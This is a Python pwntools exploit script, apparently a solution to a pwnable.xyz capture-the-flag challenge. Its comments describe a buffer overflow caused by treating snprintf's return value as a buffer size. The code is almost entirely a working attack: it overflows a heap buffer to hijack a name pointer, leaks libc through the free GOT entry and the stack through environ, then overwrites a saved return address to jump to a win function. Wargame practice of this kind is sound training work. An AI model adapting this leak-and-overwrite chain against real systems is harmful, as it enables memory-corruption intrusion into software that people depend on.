###Misuse of snprintf() return value
###snprintf does not return count of written character, but rather the expected count of characters to be written given a large enough n
###Thus, taking the return value of snprintf as new size will result in possible BOF

from pwn import *

###Structure
'''
    |   8   | 4 | 4 |
0x00|nameptr|siz|   |
0x10|  next |  prev |
'''

###Util
def create(idx):
    r.sendlineafter('> ','1')
    r.sendlineafter('> ',str(idx))

def edit(oname,nname):
    r.sendlineafter('> ','3')
    r.sendlineafter('remodel: ',oname)
    r.sendlineafter('model: ',nname)

def show():
    r.sendlineafter('> ','4')
    return r.recvuntil('\nMenu',drop=True).split(b'\n')[1:]

###Addr
#  libc2.23
edit_ret = 0x400fbd
win = 0x400b4e
free_got = 0x601f70
free_offset = 0x77760
environ_offset = 0x398fb8

###Exploit
r = remote('svc.pwnable.xyz',30037)
create(0)
create(0)

###Overflow namebuf into second chunk to hijack name ptr of second chunk and leak free_addr
edit('BMW','a'*0x30)
edit('aa',b'a'*0x20+p64(free_got))
free_addr = u64(show()[1][6:]+b'\x00\x00')
libc_base = free_addr-free_offset
print(hex(libc_base))

###Leak stack in the same way
edit(b'a'*0x20+p64(free_got),b'a'*0x30)
edit(b'a'*0x22,b'a'*0x20+p64(libc_base+environ_offset))
stack = u64(show()[1][6:]+b'\x00\x00')
rbp = stack-0xf8
print(hex(rbp))

###set second chunk pointer to return value of functions called from main
###Also set size to allow longer writes
edit(b'a'*0x20+p64(libc_base+environ_offset),b'a'*0x30)
edit(b'a'*0x25,b'a'*0x28+p32(0x20))
edit(b'a'*0x28+p32(0x20),b'a'*0x27)
edit(b'a'*0x27,b'a'*0x20+p64(rbp-0x18))

###Overwrite ret addr with win and get flag
edit(p64(edit_ret),p64(win))

r.interactive()
